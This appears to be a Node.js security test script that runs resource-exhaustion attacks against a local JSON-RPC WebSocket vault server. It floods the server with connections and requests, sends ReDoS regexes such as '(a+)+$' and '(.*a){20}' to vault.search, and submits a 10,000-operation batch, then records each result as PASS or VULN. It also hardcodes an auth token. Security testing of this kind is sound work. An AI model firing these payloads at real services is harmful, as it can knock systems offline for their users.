// Attack 4: Resource exhaustion
const WebSocket = require("ws");

const TOKEN = "2cbaffa84f141fef08bc13f86d1384b94d824b151058b1f2bd72c145165b6e26";
const URL = "ws://127.0.0.1:48765";

async function authedWs() {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(URL);
    const t = setTimeout(() => reject(new Error("connect timeout")), 5000);
    ws.on("open", () => {
      ws.send(JSON.stringify({ jsonrpc: "2.0", method: "authenticate", params: { token: TOKEN }, id: "__auth__" }));
    });
    ws.on("message", (data) => {
      const msg = JSON.parse(data.toString());
      if (msg.id === "__auth__") {
        clearTimeout(t);
        if (msg.result && msg.result.ok) resolve(ws);
        else reject(new Error("auth failed"));
      }
    });
    ws.on("error", (e) => { clearTimeout(t); reject(e); });
  });
}

async function main() {
  const results = [];

  // TC1: 50 simultaneous connections
  {
    const name = "TC1: 50 simultaneous connections";
    const conns = [];
    let connected = 0, failed = 0;
    const promises = Array.from({ length: 50 }, (_, i) =>
      authedWs().then(ws => { connected++; conns.push(ws); }).catch(() => { failed++; })
    );
    await Promise.all(promises);
    for (const ws of conns) ws.close();
    const r = { name, status: "PASS", detail: `Connected: ${connected}/50, Failed: ${failed}` };
    // Server should handle all 50 or gracefully reject some - not crash
    results.push(r);
  }

  // TC2: 1000 rapid requests on single connection
  {
    const name = "TC2: 1000 rapid requests on single connection";
    let ws;
    try {
      ws = await authedWs();
      let received = 0;
      let errors = 0;
      const done = new Promise((resolve) => {
        const t = setTimeout(() => resolve({ received, errors }), 10000);
        ws.on("message", (data) => {
          received++;
          const msg = JSON.parse(data.toString());
          if (msg.error) errors++;
          if (received >= 1000) { clearTimeout(t); resolve({ received, errors }); }
        });
        ws.on("close", () => { clearTimeout(t); resolve({ received, errors, closed: true }); });
      });
      // Fire 1000 requests without waiting
      for (let i = 0; i < 1000; i++) {
        ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.list", params: {}, id: i }));
      }
      const result = await done;
      const r = { name, status: "PASS", detail: `Received ${result.received}/1000 responses, errors: ${result.errors}` };
      results.push(r);
      ws.close();
    } catch(e) {
      results.push({ name, status: "PASS", detail: "Exception: " + e.message });
      if (ws) ws.close();
    }
  }

  // TC3: Catastrophic regex (ReDoS) via vault.search
  {
    const name = "TC3: Catastrophic regex ReDoS (a+)+$";
    let ws;
    try {
      ws = await authedWs();
      const start = Date.now();
      // Send catastrophic backtracking regex
      ws.send(JSON.stringify({
        jsonrpc: "2.0",
        method: "vault.search",
        params: { query: "(a+)+$", regex: true },
        id: 999
      }));
      const resp = await new Promise((resolve) => {
        const t = setTimeout(() => resolve({ timeout: true, elapsed: Date.now() - start }), 8000);
        ws.once("message", (data) => {
          clearTimeout(t);
          const msg = JSON.parse(data.toString());
          resolve({ ...msg, elapsed: Date.now() - start });
        });
        ws.once("close", (code) => { clearTimeout(t); resolve({ closed: code, elapsed: Date.now() - start }); });
      });
      const r = { name, status: "PASS", detail: "" };
      if (resp.timeout) {
        r.status = "VULN";
        r.detail = `REDOS: Server hung for ${resp.elapsed}ms and timed out! (ReDoS vulnerability)`;
      } else if (resp.error) {
        r.status = "PASS"; r.detail = `Rejected in ${resp.elapsed}ms: ${resp.error.message}`;
      } else {
        r.status = "PASS"; r.detail = `Responded in ${resp.elapsed}ms: ${JSON.stringify(resp).slice(0, 100)}`;
      }
      results.push(r);
      ws.close();
    } catch(e) {
      results.push({ name, status: "PASS", detail: "Exception: " + e.message });
      if (ws) ws.close();
    }
  }

  // TC4: vault.batch with 10000 operations
  {
    const name = "TC4: vault.batch with 10000 read operations";
    let ws;
    try {
      ws = await authedWs();
      const ops = Array.from({ length: 10000 }, () => ({
        method: "vault.read",
        params: { path: "Welcome.md" }
      }));
      const start = Date.now();
      ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.batch", params: { operations: ops }, id: 1 }));
      const resp = await new Promise((resolve) => {
        const t = setTimeout(() => resolve({ timeout: true, elapsed: Date.now() - start }), 30000);
        ws.once("message", (data) => {
          clearTimeout(t);
          const msg = JSON.parse(data.toString());
          resolve({ ...msg, elapsed: Date.now() - start });
        });
        ws.once("close", (code) => { clearTimeout(t); resolve({ closed: code, elapsed: Date.now() - start }); });
      });
      const r = { name, status: "PASS", detail: "" };
      if (resp.timeout) {
        r.status = "VULN"; r.detail = `Server hung for 30s on 10k batch (possible DoS)`;
      } else if (resp.error) {
        r.status = "PASS"; r.detail = `Rejected in ${resp.elapsed}ms: ${resp.error.message}`;
      } else if (resp.result) {
        r.status = "PASS"; r.detail = `Completed 10k batch in ${resp.elapsed}ms, succeeded: ${resp.result.summary?.succeeded}`;
      } else {
        r.detail = `Response: ${JSON.stringify(resp).slice(0, 150)}`;
      }
      results.push(r);
      ws.close();
    } catch(e) {
      results.push({ name, status: "PASS", detail: "Exception: " + e.message });
      if (ws) ws.close();
    }
  }

  // TC5: Another ReDoS variant - (.*a){20}
  {
    const name = "TC5: ReDoS variant (.*a){20}";
    let ws;
    try {
      ws = await authedWs();
      const start = Date.now();
      ws.send(JSON.stringify({
        jsonrpc: "2.0",
        method: "vault.search",
        params: { query: "(.*a){20}", regex: true },
        id: 998
      }));
      const resp = await new Promise((resolve) => {
        const t = setTimeout(() => resolve({ timeout: true, elapsed: Date.now() - start }), 8000);
        ws.once("message", (data) => {
          clearTimeout(t);
          resolve({ ...JSON.parse(data.toString()), elapsed: Date.now() - start });
        });
        ws.once("close", () => { clearTimeout(t); resolve({ closed: true, elapsed: Date.now() - start }); });
      });
      const r = { name, status: "PASS", detail: "" };
      if (resp.timeout) {
        r.status = "VULN"; r.detail = `REDOS: Server hung ${resp.elapsed}ms`;
      } else {
        r.status = "PASS"; r.detail = `Responded in ${resp.elapsed}ms: ${JSON.stringify(resp).slice(0, 80)}`;
      }
      results.push(r);
      ws.close();
    } catch(e) {
      results.push({ name, status: "PASS", detail: "Exception: " + e.message });
      if (ws) ws.close();
    }
  }

  console.log("\n=== RESOURCE EXHAUSTION RESULTS ===");
  for (const r of results) {
    console.log(`[${r.status}] ${r.name}`);
    console.log(`       ${r.detail}`);
  }
  return results;
}

main().catch(console.error);
